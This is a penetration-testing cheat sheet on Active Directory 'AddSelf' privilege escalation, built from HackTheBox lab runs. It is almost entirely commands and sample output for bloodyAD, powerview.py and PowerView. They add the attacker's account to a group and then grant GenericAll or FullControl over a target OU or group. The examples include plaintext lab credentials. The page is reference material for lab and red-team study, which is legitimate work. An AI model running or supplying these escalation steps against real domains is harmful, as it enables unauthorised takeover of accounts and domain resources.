---
title: "AddSelf"
date: 2025-7-23
tags: ["Powerview", "Genericall", "AddMember", "Group Policy", "Domain Controller", "Addself", "Active Directory", "Windows", "BloodyAD"]
---

### Privesc #1: Add Self to Group (From Linux)

{{< tab set1 tab1 >}}bloodyAD{{< /tab >}}
{{< tab set1 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Add Self to Group

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
[+] oorend added to SERVICEMGMT
```

```console
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
```

```console
# Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
[+] m.lovegod added to NETWORK AUDIT
```

#### 2. Add GenericAll over Target Group

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

```console
# Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
[+] m.lovegod has now GenericAll on NETWORK AUDIT
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Connect

```console
sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'
Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
[2024-09-24 07:11:06] Channel binding is enforced!
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > 
```

#### 2. Add Self to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

```console {class="sample-code"}
PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
```

```console
# Check
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
PV > Get-DomainGroupMember -Identity 'servicemgmt'
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

---[SNIP]---

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : oorend
MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
```

#### 4. Add Fullcontrol over Target Group

```console
# Exit and login again to apply changes
Add-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
```

```console {class="sample-code"}
PV > Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] DACL modified successfully!
```

```console
# Check
Get-DomainObjectAcl -Identity '<TARGET_USER>' -Where 'SecurityIdentifier contains <USER>'
```

```console {class="sample-code"}
PV > Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
```

<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>

{{< /tabcontent >}}

### Privesc #1: Add Self to Group (From Windows)

{{< tab set2 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add Self to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred
```

```console {class="sample-code"}
PS C:\programdata> Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
```

```console
# Check
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
PS C:\programdata> Get-DomainGroupMember -Identity 'security engineers'
Get-DomainGroupMember -Identity 'security engineers'

---[SNIP]---

GroupDomain             : corp.local
GroupName               : Security Engineers
GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
MemberDomain            : corp.local
MemberName              : user
MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
```

{{< /tabcontent >}}